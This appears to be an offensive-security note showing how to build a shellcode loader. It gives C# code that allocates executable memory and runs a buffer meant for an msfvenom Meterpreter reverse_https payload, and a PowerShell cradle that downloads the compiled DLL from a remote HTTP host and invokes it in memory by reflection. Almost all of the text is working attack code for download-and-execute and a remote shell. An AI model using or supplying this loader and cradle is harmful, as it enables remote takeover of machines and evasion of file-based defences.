# Create Shellcode Loader
```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
    {
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]

		static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

		[DllImport("Kernel32.dll")]

		static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		[DllImport("kernel32.dll")]

		public static extern Int32 WaitForSingleObject(IntPtr Handle, UInt32 dwMilliseconds);

		public static void runner ()
        {
			// msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.101 LPORT=443 -f csharp
			byte[] buf = new byte[738] {};

			int size = buf.Length;

			IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

			Marshal.Copy(buf, 0, addr, size);

			IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

			WaitForSingleObject(hThread, 0xFFFFFFFF);
		}
	}
}
```

Compile the code to a DLL by creating a new file as a Class Library

# Loading the DLL into memory using Reflection
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.101/ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```